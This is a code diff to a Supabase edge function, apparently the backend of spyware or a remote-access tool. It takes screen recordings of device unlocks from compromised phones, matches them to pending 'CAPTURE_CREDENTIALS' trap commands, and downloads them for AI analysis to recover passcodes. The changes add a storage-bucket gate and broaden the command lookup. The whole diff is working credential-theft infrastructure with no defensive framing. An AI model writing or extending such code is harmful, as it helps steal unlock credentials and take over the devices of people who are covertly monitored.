@@ -19,19 +19,23 @@ serve(async (req) => {
     let file_path = "";
     let device_id = "";
     let command_id = null;
+    let bucket_id = "cortex-vision-vault";
 
     // A. Parse native Supabase Database Webhook structure
     if (payload.record && payload.table === "objects") {
-      file_path = payload.record.name; // e.g., "SM_G990B_12345/SCREEN_RECORD/vid_123.mp4"
+      file_path = payload.record.name; 
+      bucket_id = payload.record.bucket_id;
       
-      // Extract device folder name (which contains the device ID)
       const pathParts = file_path.split("/");
       device_id = pathParts[0]; 
       
-      // Filter: We only want to process screen recordings
-      if (!file_path.includes("SCREEN_RECORD") && !file_path.includes("vid_")) {
-        console.log("[VISION_ENGINE] Ignored: Uploaded file is not an unlock video.");
-        return new Response(JSON.stringify({ skipped: true }), { status: 200, headers: corsHeaders });
+      // CRITICAL GATE: Abort immediately if the file is not inside the credentials bucket
+      if (bucket_id !== "cortex-vision-vault") {
+        console.log(`[VISION_ENGINE] Ignored: File uploaded to bucket '${bucket_id}'.`);
+        return new Response(JSON.stringify({ skipped: true, reason: `Invalid bucket: ${bucket_id}` }), { 
+          status: 200, 
+          headers: corsHeaders 
+        });
       }
     } 
     // B. Fallback to manual payload
@@ -39,6 +43,7 @@ serve(async (req) => {
       file_path = payload.file_path;
       device_id = payload.device_id;
       command_id = payload.command_id;
+      bucket_id = payload.bucket_id || "cortex-vision-vault";
     }
 
     if (!file_path || !device_id) {
@@ -52,7 +57,7 @@ serve(async (req) => {
     if (!geminiApiKey) throw new Error("Missing 'GEMINI_API_KEY' secret.");
     const supabase = createClient(supabaseUrl, supabaseServiceKey);
 
-    // C. Autonomous Discovery: Find the latest pending command for this device
+    // C. Autonomous Discovery: Find the latest non-finalized CAPTURE_CREDENTIALS command
     if (!command_id) {
       console.log(`[VISION_ENGINE] Querying latest pending credential trap for device: ${device_id}`);
       const { data: cmdData } = await supabase
@@ -60,7 +65,8 @@ serve(async (req) => {
         .select("id")
         .eq("device_id", device_id)
         .eq("file_name", "CAPTURE_CREDENTIALS")
-        .eq("status", "DEFERRED_EXECUTION") // Deferred trap
+        .neq("status", "RECOVERY_SUCCESS")
+        .neq("status", "RECOVERY_FAILED")
         .order("created_at", { ascending: false })
         .limit(1);
 
@@ -70,9 +76,9 @@ serve(async (req) => {
       }
     }
 
-    // D. Download video
+    // D. Download video from the dedicated bucket
     const { data: fileData, error: downloadError } = await supabase.storage
-      .from("cortex-vault")
+      .from(bucket_id)
       .download(file_path);
 
     if (downloadError || !fileData) {
